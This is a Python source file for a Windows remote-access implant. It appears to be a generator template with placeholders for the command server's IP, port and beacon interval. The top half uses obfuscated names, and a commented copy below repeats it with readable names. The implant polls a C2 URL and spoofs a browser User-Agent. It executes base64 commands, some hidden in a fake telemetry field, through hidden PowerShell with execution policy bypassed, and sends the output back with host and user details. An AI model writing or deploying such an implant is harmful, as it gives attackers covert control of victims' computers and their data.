import os as _os
import sys as _sys
import time as _tm
import base64 as _b64
import json as _js
import subprocess as _sp
import random as _rd
import string as _st
import socket as _sk
import urllib.request as _ur
import urllib.error as _ue

# ======================
# Obfuscated Configuration
# ======================

_X1 = "http://{ip}:{port}/"
_X2 = {interval}

_X3 = 0x08000000

def _Y1():
    _a = _st.ascii_lowercase + _st.digits
    return "-".join(
        "".join(_rd.choices(_a, k=5)) for _ in range(3)
    )

_Z1 = _Y1()

def _Y2():
    return {
        "host": _sk.gethostname(),
        "user": _os.environ.get("USERNAME", "unknown"),
        "cwd": _os.getcwd(),
        "os": "Windows",
        "arch": _os.environ.get("PROCESSOR_ARCHITECTURE", "unknown")
    }

def _Y3(_a: str) -> str:
    try:
        _b = _b64.b64decode(_a).decode("utf-8", errors="ignore").strip()
        if not _b:
            return ""

        if _b.lower().startswith("cd "):
            _c = _b[3:].strip()
            try:
                _os.chdir(_os.path.expandvars(_c))
                return f"[+] Changed directory to {_os.getcwd()}"
            except Exception as _d:
                return f"[!] Error changing directory: {_d}"

        if _b.lower() == "exit":
            _sys.exit(0)

        _e = [
            "powershell.exe",
            "-WindowStyle", "Hidden",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command", _b
        ]

        _f = _sp.Popen(
            _e,
            stdout=_sp.PIPE,
            stderr=_sp.PIPE,
            stdin=_sp.DEVNULL,
            creationflags=_X3
        )

        _g, _h = _f.communicate()
        _i = _g + _h

        return _i.decode("utf-8", errors="ignore")

    except SystemExit:
        raise
    except Exception as _j:
        return f"[!] Error executing command: {_j}"

def _Y4():
    _k = {
        "X-Session-ID": _Z1,
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/91.0.4472.124 Safari/537.36"
        )
    }

    while True:
        try:
            # GET task
            _l = _ur.Request(_X1, headers=_k)
            with _ur.urlopen(_l) as _m:
                if _m.status == 410:
                    _sys.exit(0)

                _n = _js.loads(_m.read().decode())
                _o = _n.get("cmd")

                # Compatibility with advanced server telemetry format
                if not _o and "DeviceTelemetry" in _n:
                    _o = _n["DeviceTelemetry"].get("Telemetry")

            if _o:
                _p = _Y3(_o)
                _q = _b64.b64encode(_p.encode()).decode()

                _r = _Y2()
                _r["output"] = _q

                _s = _js.dumps(_r).encode("utf-8")
                _t = _ur.Request(
                    _X1,
                    data=_s,
                    headers=_k,
                    method="POST"
                )
                _t.add_header("Content-Type", "application/json")

                _ur.urlopen(_t).read()

        except _ue.HTTPError as _u:
            if _u.code == 410:
                _sys.exit(0)

        except Exception:
            pass

        _tm.sleep(_X2)

# ======================
# Entry Point
# ======================

if __name__ == "__main__":
    _Y4()


# import os
# import sys
# import time
# import base64
# import json
# import subprocess
# import random
# import string
# import socket
# import urllib.request
# import urllib.error

# # ======================
# # Configuration (filled by generator)
# # ======================

# C2_URL = "http://{ip}:{port}/"
# BEACON_INTERVAL = {interval}


# CREATE_NO_WINDOW = 0x08000000

# def generate_session_id():
#     chars = string.ascii_lowercase + string.digits
#     return "-".join(
#         "".join(random.choices(chars, k=5)) for _ in range(3)
#     )

# SID = generate_session_id()



# def get_metadata():
#     return {
#         "host": socket.gethostname(),
#         "user": os.environ.get("USERNAME", "unknown"),
#         "cwd": os.getcwd(),
#         "os": "Windows",
#         "arch": os.environ.get("PROCESSOR_ARCHITECTURE", "unknown")
#     }


# def run_command(cmd_b64: str) -> str:
#     try:
#         cmd = base64.b64decode(cmd_b64).decode("utf-8", errors="ignore").strip()
#         if not cmd:
#             return ""

#         if cmd.lower().startswith("cd "):
#             path = cmd[3:].strip()
#             try:
#                 os.chdir(os.path.expandvars(path))
#                 return f"[+] Changed directory to {os.getcwd()}"
#             except Exception as e:
#                 return f"[!] Error changing directory: {e}"

#         if cmd.lower() == "exit":
#             sys.exit(0)

#         ps_command = [
#             "powershell.exe",
#             "-WindowStyle", "Hidden",
#             "-NoProfile",
#             "-ExecutionPolicy", "Bypass",
#             "-Command", cmd
#         ]

#         proc = subprocess.Popen(
#             ps_command,
#             stdout=subprocess.PIPE,
#             stderr=subprocess.PIPE,
#             stdin=subprocess.DEVNULL,
#             creationflags=subprocess.CREATE_NO_WINDOW
#         )

#         stdout, stderr = proc.communicate()
#         output = stdout + stderr

#         return output.decode("utf-8", errors="ignore")

#     except SystemExit:
#         raise
#     except Exception as e:
#         return f"[!] Error executing command: {e}"


# def main():
#     headers = {
#         "X-Session-ID": SID,
#         "User-Agent": (
#             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
#             "AppleWebKit/537.36 (KHTML, like Gecko) "
#             "Chrome/91.0.4472.124 Safari/537.36"
#         )
#     }

#     while True:
#         try:
#             # GET task
#             req = urllib.request.Request(C2_URL, headers=headers)
#             with urllib.request.urlopen(req) as response:
#                 if response.status == 410:
#                     sys.exit(0)

#                 data = json.loads(response.read().decode())
#                 cmd_b64 = data.get("cmd")

#                 # Compatibility with advanced server telemetry format
#                 if not cmd_b64 and "DeviceTelemetry" in data:
#                     cmd_b64 = data["DeviceTelemetry"].get("Telemetry")

#             if cmd_b64:
#                 output = run_command(cmd_b64)
#                 output_b64 = base64.b64encode(output.encode()).decode()

#                 post_data = get_metadata()
#                 post_data["output"] = output_b64

#                 encoded = json.dumps(post_data).encode("utf-8")
#                 post_req = urllib.request.Request(
#                     C2_URL,
#                     data=encoded,
#                     headers=headers,
#                     method="POST"
#                 )
#                 post_req.add_header("Content-Type", "application/json")

#                 urllib.request.urlopen(post_req).read()

#         except urllib.error.HTTPError as e:
#             if e.code == 410:
#                 sys.exit(0)

#         except Exception:
#             pass

#         time.sleep(BEACON_INTERVAL)


# if __name__ == "__main__":
#     main()